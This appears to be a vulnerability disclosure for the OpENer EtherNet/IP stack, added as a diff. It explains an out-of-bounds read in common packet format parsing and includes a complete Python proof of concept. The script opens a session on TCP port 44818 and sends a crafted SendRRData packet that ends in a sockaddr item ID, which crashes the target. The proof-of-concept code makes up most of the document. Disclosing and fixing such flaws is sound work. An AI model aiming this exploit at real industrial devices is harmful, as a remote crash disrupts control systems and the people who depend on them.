@@ -1,0 +1,125 @@
+issue #753
+
+Summary
+I confirmed a remotely reachable out-of-bounds read on current master in the unconnected explicit TCP SendRRData path.
+
+The crash occurs before NotifyMessageRouter() is entered. The root cause is that CreateCommonPacketFormatStructure() recognizes optional sockaddr info items (0x8000 / 0x8001) and then unconditionally reads the rest of the fixed sockaddr structure without first verifying that those bytes are still within the received CPF buffer. The first invalid access occurs in GetIntFromMessage(), and ASan reports it as a stack-buffer-overflow because the out-of-bounds read crosses the right boundary of incoming_message[512] in HandleDataOnTcpSocket().
+
+Version
+OpENer v2.3 / master branch up to commit 76b95cf
+
+PoC
+
+#!/usr/bin/env python3
+import os
+import socket
+import struct
+import sys
+
+
+PORT = 44818
+HOST = os.environ.get("OPENER_HOST", "127.0.0.1")
+
+
+def encap(command: int, session: int, payload: bytes, context: bytes) -> bytes:
+    return struct.pack("<HHII8sI", command, len(payload), session, 0, context, 0) + payload
+
+
+def register_session(sock: socket.socket) -> int:
+    request = encap(0x0065, 0, struct.pack("<HH", 1, 0), b"REGSESSN")
+    sock.sendall(request)
+    response = sock.recv(1024)
+    if len(response) < 8:
+        raise RuntimeError(f"short RegisterSession response: {response.hex()}")
+    return struct.unpack_from("<I", response, 4)[0]
+
+
+def build_payload(mode: str) -> tuple[bytes, bytes]:
+    if mode == "baseline":
+        cip = bytes([0x0E, 0x03, 0x20, 0x01, 0x24, 0x01, 0x30, 0x01])
+        cpf = struct.pack(
+            "<HHHHH",
+            2,      # item count
+            0x0000, # Null Address Item
+            0x0000, # Null Address length
+            0x00B2, # Unconnected Data Item
+            len(cip),
+        ) + cip
+        context = b"CPFBASE!"
+    elif mode == "crash":
+        # Packet layout:
+        # 24-byte encapsulation header
+        # 6-byte SendRRData command-specific header
+        # 482-byte CPF payload
+        #
+        # The last two bytes of the full 512-byte TCP packet are a recognized
+        # sockaddr info type id (0x8000). CreateCommonPacketFormatStructure()
+        # then tries to read its length/family/port/address without checking
+        # that those 18 bytes are still inside the received buffer.
+        cpf = (
+            struct.pack("<HHHHH", 3, 0x0000, 0x0000, 0x00B2, 470)
+            + (b"A" * 470)
+            + struct.pack("<H", 0x8000)
+        )
+        if len(cpf) != 482:
+            raise RuntimeError(f"unexpected crash CPF length: {len(cpf)}")
+        context = b"CPFOVR!!"
+    else:
+        raise ValueError(mode)
+
+    payload = struct.pack("<IH", 0, 0) + cpf
+    return payload, context
+
+
+def parse_mr_reply(response: bytes) -> None:
+    if not response:
+        print("response=timeout")
+        return
+
+    offset = 24 + 6 + 2 + 4 + 4
+    mr = response[offset:]
+    if len(mr) < 4:
+        print(f"response={response.hex()}")
+        return
+
+    reply_service, _reserved, general_status, add_status_size = mr[:4]
+    pos = 4
+    add_status = []
+    for _ in range(add_status_size):
+        add_status.append(struct.unpack_from("<H", mr, pos)[0])
+        pos += 2
+
+    print(
+        f"reply_service=0x{reply_service:02x} general_status=0x{general_status:02x} "
+        f"additional_status={add_status} payload={mr[pos:].hex()}"
+    )
+
+
+def main() -> int:
+    mode = sys.argv[1] if len(sys.argv) > 1 else "crash"
+    host = sys.argv[2] if len(sys.argv) > 2 else HOST
+    if mode not in {"baseline", "crash"}:
+        print(f"usage: {sys.argv[0]} [baseline|crash] [host]", file=sys.stderr)
+        return 2
+
+    payload, context = build_payload(mode)
+    packet = encap(0x006F, 0, payload, context)
+    print(f"mode={mode} host={host} payload_len={len(payload)} packet_len={len(packet)}")
+
+    with socket.create_connection((host, PORT), timeout=3.0) as sock:
+        session = register_session(sock)
+        print(f"session={session}")
+        packet = encap(0x006F, session, payload, context)
+        sock.sendall(packet)
+        sock.settimeout(1.0)
+        try:
+            response = sock.recv(4096)
+        except socket.timeout:
+            response = b""
+
+    parse_mr_reply(response)
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
